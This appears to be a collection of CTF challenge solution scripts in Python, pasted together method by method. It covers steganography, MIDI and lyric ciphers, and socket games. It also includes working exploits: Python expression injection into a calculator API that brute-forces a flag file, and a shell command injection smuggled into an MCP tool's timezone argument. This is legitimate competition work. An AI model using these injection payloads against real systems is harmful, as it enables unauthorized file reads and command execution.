                print(&#34;Length found: &#34;, i)
                return i

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def payload_maker(self, password, number):
        payload = {&#34;password&#34;: password, &#34;number&#34;: number}
        return json.dumps(payload)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def main(self):
        self.real_url = f&#34;http://{self.url}:{self.port}&#34;
        self.url_path = f&#34;{self.real_url}/calculate&#34;
        # self.sending_request()
        self.preparing_dictionary()
        self.get_flag_length()
        self.flag = &#34;ECSC{&#34;
        self.bruteforcer()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def sending_request(self, exploit=None, verbose=False):

        # payload = &#34;```python\nwith open(&#39;/app/flag.txt&#39;) as f:\n result = f.read()\nprint(result)\n```&#34;

        headers = {
            &#34;Content-Type&#34;: &#34;application/json&#34;,
            &#34;Origin&#34;: self.real_url,
            &#34;Referer&#34;: f&#34;{self.real_url}/&#34;,
            &#34;User-Agent&#34;: &#34;Mozilla/5.0 (X11; Linux x86_64)&#34;,
            &#34;Accept&#34;: &#34;*/*&#34;,
        }
        payload = {&#34;equation&#34;: exploit}

        response = requests.post(self.url_path, headers=headers, json=payload)
        if verbose:
            print(&#34;[+] Status:&#34;, response.status_code)
            print(&#34;[+] Response:&#34;, response.text)
            print(response.json())
        return response.json()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def get_flag_length(self):
        exploit = &#34;0+len(open(&#39;/app/flag.txt&#39;).read())&#34;
        response = self.sending_request(exploit=exploit, verbose=False)
        if response and &#34;result&#34; in response:
            try:
                self.flag_length = int(response[&#34;result&#34;])
                print(f&#34;[+] Flag length: {self.flag_length}&#34;)
            except ValueError:
                print(&#34;[-] Failed to parse flag length.&#34;)
        else:
            print(&#34;[-] No valid response received.&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def exploit_development(self, i, letter):
        # variable = &#34;+&#34;.join([ord(l) * 1000 * i for i, l in enumerate(&#34;ECSC{TEST}&#34;)])
        # print(variable)
        exploit = f&#34;0+(1 if open(&#39;/app/flag.txt&#39;).read()[{i}]==&#39;{letter}&#39; else 0)&#34;
        return exploit

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def preparing_dictionary(self):
        &#34;&#34;&#34;
        This method is not used in the current solution.
        It can be implemented if needed for future enhancements.
        &#34;&#34;&#34;
        additional = {
            &#34;e&#34;: 3,
            &#34;a&#34;: 4,
            &#34;i&#34;: 1,
            &#34;o&#34;: 0,
            &#34;s&#34;: 5,
            &#34;t&#34;: 7,
            &#34;g&#34;: 9,
        }
        self.dictionary = &#34;_-{}&#34;
        for i in range(len(ascii_uppercase)):
            if ascii_lowercase[i] in additional:
                self.dictionary += str(additional[ascii_lowercase[i]])
            self.dictionary += ascii_uppercase[i] + ascii_lowercase[i]
        self.dictionary += digits + punctuation

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def bruteforcer(self):
        for i in range(len(self.flag), self.flag_length):
            for letter in self.dictionary:
                exploit = self.exploit_development(i, letter)
                # print(f&#34;[+] Trying: {exploit}&#34;)
                response = self.sending_request(exploit=exploit)
                if response and &#34;result&#34; in response:
                    try:
                        result = int(response[&#34;result&#34;])
                        if result == 1:
                            print(
                                f&#34;[+] Found character at position {i}: {letter}. Flag so far: {self.flag + letter}&#34;
                            )
                            self.flag += letter
                            break
                        else:
                            print(f&#34;[-] Character at position {i} is not: {letter}&#34;)
                    except ValueError:
                        print(&#34;[-] Failed to parse response.&#34;)
                else:
                    print(&#34;[-] No valid response received.&#34;)

        print(f&#34;[+] Final flag: {self.flag}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def validate_flag(self):
        for i, letter in enumerate(self.flag):
            exploit = self.exploit_development(i, letter)
            print(f&#34;[+] Trying: {letter}&#34;)
            response = self.sending_request(exploit=exploit)
            if response and &#34;result&#34; in response:
                try:
                    result = int(response[&#34;result&#34;])
                    if result == 0:
                        print(f&#34;[-] Flag is invalid at position {i}: {letter}&#34;)
                        return False
                except ValueError:
                    print(&#34;[-] Failed to parse response.&#34;)
                    return False
            else:
                print(&#34;[-] No valid response received.&#34;)
                return False
        print(&#34;[+] Flag is valid!&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/InitialChallenge/payloads/solution.py
    def main(self):
        image = self.folfil(&#34;files&#34;, &#34;qo91ni.jpg&#34;)
        img = Image.open(image)
        r, g, b = img.split()
        r_lsb = np.array(r) &amp; 1
        g_lsb = np.array(g) &amp; 1
        b_lsb = np.array(b) &amp; 1
        combined = (r_lsb &lt;&lt; 2) | (g_lsb &lt;&lt; 1) | b_lsb
        Image.fromarray((combined * 32).astype(np.uint8)).show()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def bruteforcing_failed(self):
        self.KEY = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]
        flag = []
        all_letters = ascii_letters + punctuation
        for i in self.KEY:
            # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
            flag.append(all_letters[(i) % len(all_letters)])
        self.flag = &#34;&#34;.join(flag)
        print(self.flag)
        # print(ascii_letters)
        print(all_letters)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def main(self):

        # self.bruteforcing_failed()
        # return
        self.music21_analysis()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def music21_analysis(self):
        # midi_file_path = &#34;/mnt/data/flag.midi&#34;
        self.midi = converter.parse(self.challenge_file)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def music21_note_analysis(self):
        # Analyze structure and extract textual representation
        notes_data = []
        for element in self.midi.flatten():
            # print(element)
            notes_data.append(str(element))
            # if isinstance(element, note.Note):
            #     notes_data.append(str(element.pitch))
            # elif isinstance(element, chord.Chord):
            #     notes_data.append(&#34;.&#34;.join(str(n) for n in element.normalOrder))

        return

        analysis = []

        for i, element in enumerate(notes_data):
            split_element = element.split(&#34; &#34;)
            if &#34;.&#34; in split_element[0]:
                analysis.append(
                    {
                        &#34;sort&#34;: i,
                        &#34;type&#34;: split_element[0].split(&#34;.&#34;)[1],
                        &#34;value&#34;: &#34; &#34;.join(split_element[1:]),
                    }
                )
            else:
                analysis.append({&#34;sort&#34;: i, &#34;type&#34;: &#34;generic&#34;, &#34;value&#34;: element})

        with open(self.folfil(&#34;data&#34;, &#34;analysis_music_21.json&#34;), &#34;w&#34;) as f:
            import json

            json.dump(analysis, f, indent=4)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_functions(self, variable, under=False):
        &#34;&#34;&#34;
        Get all functions of a variable
        &#34;&#34;&#34;

        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func))
            and (under or not (func.startswith(&#34;__&#34;)))
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_attributes(self, variable):
        &#34;&#34;&#34;
        Get all attributes of a variable
        &#34;&#34;&#34;

        return [
            attr
            for attr in dir(variable)
            if not callable(getattr(variable, attr)) and not (attr.startswith(&#34;__&#34;))
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_instruments(self):
        &#34;&#34;&#34;
        Returns a list of instruments in the MIDI file.
        &#34;&#34;&#34;

        for instrument in self.midi_data.instruments:
            print(instrument)
        return self.midi_data.instruments

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def init_some_values(self):
        self.key = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def main(self):
        self.init_some_values()
        self.midi_data = pretty_midi.PrettyMIDI(self.challenge_file.as_posix())
        instruments = self.midi_data.instruments

        piano = instruments[1]
        notes = [note.pitch for note in piano.notes]

        chosen = [notes[c] for c in self.key]

        flag = &#34;&#34;.join([chr(c) for c in chosen])

        flag = flag[:4] + &#34;{&#34; + flag[4:] + &#34;}&#34;
        print(&#34;Flag:&#34;, flag)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def load_lyrics(self):

        files = [
            &#34;lyrics_partial.txt&#34;,
            &#34;lyrics.txt&#34;,
            &#34;greek_lyrics.txt&#34;,
            &#34;genius_lyrics.txt&#34;,
        ]

        with open(self.folfil(&#34;data&#34;, files[1]), &#34;r&#34;) as f:
            lyrics = f.read().strip()
        return lyrics

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def dictionary_analysis(self, lyrics):
        d = defaultdict(list)
        for i, c in enumerate(lyrics):
            d[c].append(i)
        return d

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def print_dictionary(self, d):
        sorted_items = sorted(d.items(), key=lambda x: x[0])
        for key, value in sorted_items:
            print(f&#34;{key}: {value}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyric_transpose(self, lyrics, offset, wrap=True):
        if offset &gt; len(lyrics):
            offset = offset % len(lyrics)

        result = lyrics[offset:]
        if wrap:
            result += lyrics[:offset]

        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyric_transformation(self, lyrics):

        punctuation_used = set()
        for c in lyrics:
            if c not in ascii_letters + digits + &#34; &#34;:
                punctuation_used.add(c)

        lyrics_only_letters = &#34;&#34;.join([c for c in lyrics if c.isalnum()])
        lyrics_with_spaces = lyrics.replace(&#34;\n&#34;, &#34; &#34;)
        lyrics_without_punctuation = lyrics_with_spaces.replace(&#34;&#39;&#34;, &#34;&#34;).replace(
            &#34;,&#34;, &#34;&#34;
        )
        return lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyrics_all(self):
        &#34;&#34;&#34;
        Description:
            This function generates all possible combinations of lyrics transformations
            based on the provided replace_combos and control_combos.
            It uses itertools.product to create combinations of the specified number
            of transformations, allowing for flexible lyric manipulation.
        Returns:
            list: A list of transformed lyrics combinations.
        &#34;&#34;&#34;
        lyrics = self.load_lyrics()
        control_combos = self.creating_control_combos(
            start=0, end=1, number=len(self.replace_combos)
        )
        return [
            self.lyrics_transformation(lyrics, self.replace_combos, control)
            for control in control_combos
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def creating_control_combos(self, start=0, end=1, number=8):
        if start &gt;= end:
            raise ValueError(&#34;Start must be less than end.&#34;)
        if number &lt; 1:
            raise ValueError(&#34;Number of combinations must be at least 1.&#34;)
        return list(itertools.product(range(start, end + 1), repeat=number))

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyrics_transformation(self, lyrics, replace_combos, control_combos=None):
        if control_combos is None:
            return lyrics

        for control, combo in zip(control_combos, replace_combos):
            if control:
                if len(combo[0]) &gt; 1:
                    lyrics = lyrics.replace(*combo[0]).replace(*combo[1])
                else:
                    lyrics = lyrics.replace(*combo)
        return lyrics

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def brute_transpose_find_flag(
        self,
        lyrics: str,
        partial_flag: str,
        keys: list,
        verbose: bool = False,
        wrap: bool = True,
    ):
        &#34;&#34;&#34;
        Description:
            For the lyrics given

        Args:
            lyrics (str): Lyrics given
            partial_flag (str): partial flag to look
            verbose (bool, optional): _description_. Defaults to False.

        Returns:
            str: possible flag
        &#34;&#34;&#34;

        for i in range(len(lyrics)):
            transposed = self.lyric_transpose(lyrics, i, wrap=wrap)
            if verbose and i % 100 == 0:
                print(f&#34;Trying offset: {i}&#34;)
            temp_flag = self.position_cipher(transposed, keys)
            if &#34;ecsc&#34; in temp_flag.lower() or self.check_for_rot(
                temp_flag, partial_flag
            ):
                print(f&#34;Found flag: {temp_flag} - Offset: {i}&#34;)
                return temp_flag

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def check_for_rot(self, text, partial=&#34;ecsc&#34;):
        &#34;&#34;&#34;
        Description:
            Checks if the text is a rotation of &#34;ecsc&#34;.
            This function checks if the first four characters of the text
            can be rearranged to form the string &#34;ecsc&#34;. It does this by
            comparing the ASCII values of the characters in the text with
            the ASCII values of the characters in &#34;ecsc&#34;. If the conditions
            are met, it returns True, indicating that the text is a rotation
            of &#34;ecsc&#34;. Otherwise, it returns False.
            This function is useful for identifying specific patterns in the text
            that match the structure of &#34;ecsc&#34;, which could be relevant in certain

            Challenge_specific
        Args:
            text (_type_): _description_

        Returns:
            _type_: _description_
        &#34;&#34;&#34;

        if len(partial) != 4:
            raise ValueError(
                &#34;Partial must be exactly 4 characters long. Challenge_specific&#34;
            )
        text = text.lower()

        check1 = (ord(partial[0]) - ord(partial[1])) == (ord(text[0]) - ord(text[1]))
        check2 = (ord(partial[2]) - ord(partial[1])) == (ord(text[2]) - ord(text[1]))
        check3 = ord(text[3]) == ord(text[1])

        return check1 and check2 and check3

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def position_cipher(self, text: str, keys: list):
        &#34;&#34;&#34;
        Description:
            This function takes a text and a list of keys, and returns a new string
            where each character in the text is replaced by the character at the
            corresponding index in the keys list. If the index exceeds the length of
            the text, it wraps around using modulo operation.
        Args:
            text (str): The input text to be transformed.
            keys (list): A list of integers representing the positions in the text.
        Returns:
            str: A new string formed by replacing characters in the text based on the keys.
        &#34;&#34;&#34;

        return &#34;&#34;.join(text[i % len(text)] for i in keys)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def bruteforce_all_lyrics(
        self,
        all_lyrics: list,
        partial_flag: str,
        keys: list,
        verbose: bool = False,
        wrap: bool = True,
    ):
        results = []
        for lyric_i, lyrics in enumerate(all_lyrics):
            if verbose:
                print(f&#34;Processing lyrics {lyric_i + 1}/{len(all_lyrics)}&#34;)
            result = self.brute_transpose_find_flag(
                lyrics=lyrics,
                partial_flag=partial_flag,
                keys=keys,
                verbose=verbose,
                wrap=wrap,
            )
            if result:
                results.append([lyric_i, result])

        return results

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def init_some_values(self):
        self.key = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]

        self.replace_combos = [
            (&#34; &#34;, &#34;&#34;),
            (&#34;,&#34;, &#34; &#34;),
            ((&#34;,&#34;, &#34; &#34;), (&#34;&#39;&#34;, &#34; &#34;)),
            ((&#34;,&#34;, &#34;&#34;), (&#34;&#39;&#34;, &#34;&#34;)),
            (&#34;,&#34;, &#34;&#34;),
            (&#34;&#39;&#34;, &#34; &#34;),
            (&#34;&#39;&#34;, &#34;&#34;),
            (&#34;\n&#34;, &#34; &#34;),
            (&#34;\n&#34;, &#34;&#34;),
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def another_attempt(self):

        lyrics = self.load_lyrics()

        lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation = (
            self.lyric_transformation(lyrics)
        )

        print(lyrics_only_letters)
        print(lyrics_with_spaces)
        print(lyrics_without_punctuation)

        # flag = self.bruteforce(lyrics, self.key)
        # print(flag)
        # flag = self.bruteforce(lyrics_only_letters, self.key)
        # print(flag)
        flag = self.brute_transpose_find_flag(lyrics_with_spaces, self.key)
        print(flag)
        flag = self.brute_transpose_find_flag(lyrics_without_punctuation, self.key)
        print(flag)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def main(self):

        self.init_some_values()

        all_lyrics = self.lyrics_all()

        partial_flag = &#34;ecsc&#34;

        results = self.bruteforce_all_lyrics(
            all_lyrics, partial_flag, keys=self.key, verbose=True, wrap=True
        )
        if results:
            for lyric_i, result in results:
                print(f&#34;Lyric {lyric_i + 1}: {result}&#34;)
        else:
            print(&#34;No results found.&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def bruteforcing_failed(self):

        flag = &#34;&#34;
        for i in range(len(self.KEY)):
            # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
            flag += ascii_letters[(self.KEY[i]) % len(ascii_letters)]
        self.flag = flag

        print(self.flag)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def main(self):

        # variables = &#34;MThdMTrk&#34;
        # variables = &#34;MTrk&#34;

        self.KEY = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]
        self.music21_analysis()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def music21_analysis(self):
        # midi_file_path = &#34;/mnt/data/flag.midi&#34;
        midi = converter.parse(self.challenge_file)

        # Analyze structure and extract textual representation
        notes_data = []
        for element in midi.flatten():
            # print(element)
            notes_data.append(str(element))
            # if isinstance(element, note.Note):
            #     notes_data.append(str(element.pitch))
            # elif isinstance(element, chord.Chord):
            #     notes_data.append(&#34;.&#34;.join(str(n) for n in element.normalOrder))

        # Show first 50 note/chord representations
        with open(self.folfil(&#34;data&#34;, &#34;analysis_music_21.json&#34;), &#34;w&#34;) as f:
            import json

            json.dump(notes_data, f, indent=4)
        print(notes_data)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def recv_send(
        self,
        text,
        lines=None,
        text_until=None,
        display=False,
        save=False,
        ansi_escape=False,
    ):
        &#34;&#34;&#34;
        Description:
            Receives lines and sends a response.
            It can receive a number or lines, and/or specific text.
            If save is True, it saves the output of the menu in a list and returns it.
            If display is True, it prints the output of everything received.

        Args:
            choice (int or str): Choice to send to the menu
            menu_num (int, optional): Number of options printed in the menu. Defaults to None.
            menu_text (str, optional): Text that the menu asks before sending your choice. Defaults to None.
            display (bool, optional): Variable to print every received line. Defaults to False.
            save (bool, optional): . Defaults to False.
        Returns:
            list: List of output of the menu if save is True
        &#34;&#34;&#34;
        if save:
            result = []

        if lines is None:
            lines = 0

        out_lines = self.recv_lines(number=lines, display=display, save=save)

        if save:
            result.extend(out_lines)

        if text_until:
            out_text_until = self.recv_until(text=text_until, ansi_escape=ansi_escape)

        if ansi_escape:
            out_text_until = self.extract_printable_with_spaces(
                out_text_until.decode(&#34;utf-8&#34;)
            )

        if save:
            result.append(out_text_until)

        if display:
            print(out_text_until)

        self.send(text)

        if save:
            return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def recv_until(self, text, **kwargs) -&gt; bytes:
        &#34;&#34;&#34;
        Description:
            Receive data until one of `delims`(text) provided is encountered. It encodes the text before sending it.
            Wrapper for self.conn.recvuntil(text.encode())
            Can also drop the ending if drop is True. If the request is not satisfied before ``timeout`` seconds pass, all data is buffered and an empty string (``&#39;&#39;``) is returned.
        Args:
            text (str): Text to receive until
            **kwargs: Additional keyword arguments to pass to the recv
                - drop (bool, optional): Drop the ending.  If :const:`True` it is removed from the end of the return value. Defaults to False.
                - timeout (int, optional): Timeout in seconds. Defaults to default.

        Raises:
            exceptions.EOFError: The connection closed before the request could be satisfied

        Returns:
            A string containing bytes received from the socket,
            or ``&#39;&#39;`` if a timeout occurred while waiting.

        &#34;&#34;&#34;

        # Handles the connection closed before the request could be satisfied
        if kwargs.get(&#34;ansi_escape&#34;, False):
            text = self.simulate_ansi_typing(text, escape_codes=False)
        kwargs = {k: v for k, v in kwargs.items() if k not in [&#34;ansi_escape&#34;]}
        try:
            return self.conn.recvuntil(text.encode(), **kwargs)
        except EOFError:
            print(&#34;Connection closed before the request could be satisfied&#34;)
            return b&#34;&#34;

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def get_welcome_message(self):
        self.recv_lines(2)
        time.sleep(0.5)
        self.recv_lines(4)
        time.sleep(0.5)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def extract_printable_with_spaces(self, text):
        # Remove ANSI escape sequences (e.g., \x1b[?25l, \x1b[?25h, \x1b[K, \x1b[1C, etc.)
        # ansi_escape = re.compile(r&#34;\x1b\[[0-9;?]*[A-Za-z]&#34;)
        # ansi_escape = re.compile(r&#34;\x1b\[[0-9;?]*[A-Za-z]&#34;)
        ansi_escape = re.compile(r&#34;\x1b\[.*?[@-~]&#34;)
        cleaned = ansi_escape.sub(&#34;&#34;, text)

        return cleaned

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def simulate_ansi_typing(self, text, escape_codes=True):
        result = &#34;&#34;
        for char in text:
            if char == &#34; &#34;:
                # Simulate clearing and moving cursor for space too
                result += &#34;\x1b[?25l\x1b[K\x1b[1C\x1b[?25h&#34;
            else:
                result += f&#34;\x1b[?25l{char}\x1b[?25h&#34;
        # result += &#34;\n&#34;  # Optional: simulate Enter
        if escape_codes:
            # Add ANSI escape codes to simulate typing
            return repr(result)
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def play_round(self):
        time.sleep(1)
        choice = [1, 2][0]
        # Get the visible number
        visible_number = self.recv_lines(1, save=True)[0]
        # print(visible_number)
        print(self.extract_printable_with_spaces(visible_number.decode(&#34;utf-8&#34;)))
        # visible_number = int(visible_number.split()[-1])
        # User choice
        # text_until = self.simulate_ansi_typing(&#34;&gt; &#34;)
        text_until = &#34;&gt; &#34;
        # out = self.recv_send(
        #     text_until=text_until,
        #     lines=5,
        #     text=choice,
        #     display=True,
        #     save=True,
        # )
        out = self.recv_lines(6, save=True)
        for line in out:
            print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))

        out = self.recv_until(text=text_until, ansi_escape=False)
        # print(out)
        self.send(choice)
        # for line in out:
        #     print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))
        out = self.recv_lines(2, save=True)
        for line in out:
            print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def play_game(self):
        self.choice_text = &#34;The number on the table is &#34;
        self.initiate_connection()
        self.get_welcome_message()

        # Some kind of loop probably
        self.play_round()

        round_result = self.recv_lines(1, save=True)[0]
        print(round_result)
        if &#34;10/10&#34; in round_result:
            self.recv_lines(3, display=True)

        self.conn.close()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def testing_ansii_escape(self):
        # self.play_game()

        text_until = self.simulate_ansi_typing(&#34;&gt; &#34;)
        print(text_until)
        phrase = b&#34;The number on the table is 31&#34;
        print(f&#34;Simulating typing: {phrase}&#34;)
        simulated_typing = self.simulate_ansi_typing(phrase)
        print(f&#34;Simulated typing output: {simulated_typing}&#34;)

        encoded = &#34;\x1b[?25lT\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25lu\x1b[?25h\x1b[?25lm\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25lr\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lo\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25la\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25ll\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25li\x1b[?25h\x1b[?25ls\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25l3\x1b[?25h\x1b[?25l1\x1b[?25h\n&#34;

        print(f&#34;Encoded output: {encoded}&#34;)
        # Simulate sending the encoded string
        encoded = self.extract_printable_with_spaces(encoded)
        print(f&#34;Extracted printable output: {encoded}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def main(self):
        self.play_game()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def initialize_values(self):
        # 2) Initialize MCP
        self.init = {
            &#34;jsonrpc&#34;: &#34;2.0&#34;,
            &#34;id&#34;: 1,
            &#34;method&#34;: &#34;initialize&#34;,
            &#34;params&#34;: {
                &#34;protocolVersion&#34;: &#34;2024-11-05&#34;,
                &#34;capabilities&#34;: {},
                &#34;clientInfo&#34;: {
                    &#34;name&#34;: &#34;challenge_solution&#34;,
                    &#34;version&#34;: &#34;1.0&#34;,
                },
            },
        }
        self.base_url = f&#34;http://{self.url}:{self.port}&#34;
        self.sse_url = f&#34;{self.base_url}/sse&#34;

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def setup_request(self):
        self.session = requests.Session()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def setup_sse(self, sse_url):
        self.messages = SSEClient(sse_url, session=self.session)
        first = next(self.messages).data
        m = re.search(r&#34;session_id=([a-f0-9]+)&#34;, first)
        if not m:
            raise SystemExit(&#34; Couldn&#39;t get session_id&#34;)
        self.sid = m.group(1)
        self.post_url = f&#34;{self.base_url}/messages/?session_id={self.sid}&#34;

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def exploit(self):
        # 3) Exploit: call get_current_time with injection
        # Note: no literal spaces allowed, so we use ${IFS} to stand in for a space.
        injection = &#39;Europe/Athens&#34;;cat${IFS}flag.txt;#&#39;
        cat_call = {
            &#34;jsonrpc&#34;: &#34;2.0&#34;,
            &#34;id&#34;: 2,
            &#34;method&#34;: &#34;tools/call&#34;,
            &#34;params&#34;: {&#34;name&#34;: &#34;get_current_time&#34;, &#34;arguments&#34;: {&#34;tz&#34;: injection}},
        }

        self.session.post(self.post_url, json=cat_call)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def tools_result(self):
        # 4) Listen for the tools result (either an &#34;id&#34;:2 result or a tools/result notification)
        for msg in self.messages:
            try:
                pkt = json.loads(msg.data)
            except json.JSONDecodeError:
                continue

            # Case A: direct JSON-RPC reply
            if pkt.get(&#34;id&#34;) == 2 and &#34;result&#34; in pkt:
                out = pkt[&#34;result&#34;]
            # Case B: a tools/result notification
            elif (
                pkt.get(&#34;method&#34;) == &#34;tools/result&#34;
                and pkt.get(&#34;params&#34;, {}).get(&#34;id&#34;) == 2
            ):
                out = pkt[&#34;params&#34;][&#34;result&#34;]
            else:
                continue

            # out might be a string or a more structured object.
            text = out if isinstance(out, str) else json.dumps(out)

            # Search for our ECSC flag
            m2 = re.search(r&#34;(ECSC\{.*?\})&#34;, text)
            if m2:
                flag = m2.group(1)
                print(&#34;Flag found:&#34;, flag)
            else:
                print(&#34;No flag in tool output. Raw output:&#34;)
                print(text)
            break
        return flag

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def interacting_with_mcp(self):
        self.session.post(self.post_url, json=self.init)
        # wait for init reply
        for msg in self.messages:
            data = json.loads(msg.data)
            if data.get(&#34;id&#34;) == 1:
                # send initialized notification
                self.session.post(
                    self.post_url,
                    json={&#34;jsonrpc&#34;: &#34;2.0&#34;, &#34;method&#34;: &#34;notifications/initialized&#34;},
                )
            break

        self.exploit()
        flag = self.tools_result()
        if flag:
            print(f&#34;Flag: {flag}&#34;)
        else:
            print(&#34; Flag not found&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def main(self):
        self.initialize_values()
        self.setup_request()
        self.setup_sse(self.sse_url)
        self.interacting_with_mcp()

